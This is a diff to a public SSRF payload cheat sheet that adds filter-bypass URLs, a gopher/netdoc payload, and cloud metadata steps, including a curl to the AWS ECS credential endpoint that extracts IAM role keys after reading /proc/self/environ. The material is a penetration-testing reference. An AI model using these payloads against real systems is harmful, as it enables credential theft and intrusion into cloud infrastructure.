@@ -8,17 +8,17 @@
 * [Payloads with localhost](#payloads-with-localhost)
 * [Bypassing filters](#bypassing-filters)
   * [Bypass using HTTPS](#bypass-using-https)
-  * [Bypass localhost with [::]](#bypass-localhost-with----)
+  * [Bypass localhost with [::]](#bypass-localhost-with-)
   * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
   * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
   * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
-  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6-ipv4-address-embedding)
+  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
   * [Bypass using bash variables](#bypass-using-bash-variables)
   * [Bypass using tricks combination](#bypass-using-tricks-combination)
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
-  * [Bypass filter_var() php function](#bypass-filter-var-php-function)
+  * [Bypass filter_var() php function](#bypass-filter_var-php-function)
   * [Bypass against a weak parser](#bypass-against-a-weak-parser)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
   * [file://](#file)
@@ -28,10 +28,13 @@
   * [tftp://](#tftp)
   * [ldap://](#ldap)
   * [gopher://](#gopher)
+  * [netdoc://](#netdoc)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
+  * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
   * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
+  * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
   * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
   * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
   * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
@@ -48,6 +51,8 @@
 
 - [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
+- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
+- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
 
 ## Payloads with localhost
 
@@ -114,6 +119,7 @@ http://0000::1:3128/ Squid
 ### Bypass localhost with a domain redirection
 
 ```powershell
+http://spoofed.burpcollaborator.net
 http://localtest.me
 http://customer1.app.localhost.my.company.127.0.0.1.nip.io
 http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
@@ -216,7 +222,7 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
 http://127.1.1.1:80#\@127.2.2.2:80/
 ```
 
-![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/Images/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20Injection/Images/WeakParser.jpg)
+![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
 
 ## SSRF exploitation via URL Scheme
@@ -242,7 +248,7 @@ ssrf.php?url=http://127.0.0.1:80
 ssrf.php?url=http://127.0.0.1:443
 ```
 
-![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20Injection/Images/SSRF_stream.png)
+![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)
 
 The following URL scheme can be used to probe the network
 
@@ -341,6 +347,14 @@ Content of evil.com/redirect.php:
 ?>
 ```
 
+### Netdoc
+
+Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
+
+```powershell
+ssrf.php?url=gopher://127.0.0.1:4242/DATA
+```
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -418,6 +432,15 @@ E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugi
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
 
+### SSRF URL for AWS ECS
+
+If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.
+
+```powershell
+curl http://169.254.170.2/v2/credentials/<UUID>
+```
+
+This way you'll extract IAM keys of the attached role
 
 ### SSRF URL for AWS Elastic Beanstalk
 
@@ -439,7 +462,20 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbean
 Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
 
 
+### SSRF URL for AWS Lambda
+
+AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.
+
+```powershell
+http://localhost:9001/2018-06-01/runtime/invocation/next
+$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+```
+
+Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
+
 ### SSRF URL for Google Cloud
+
+:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.
 
 Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
 
@@ -592,6 +628,11 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
 bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 ```
 
+More info:
+
+- Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
+- Docker Engine API: https://docs.docker.com/engine/api/latest/
+
 ### SSRF URL for Rancher
 
 ```powershell
@@ -629,3 +670,7 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
+- [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
+- [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
+- [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
+- [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
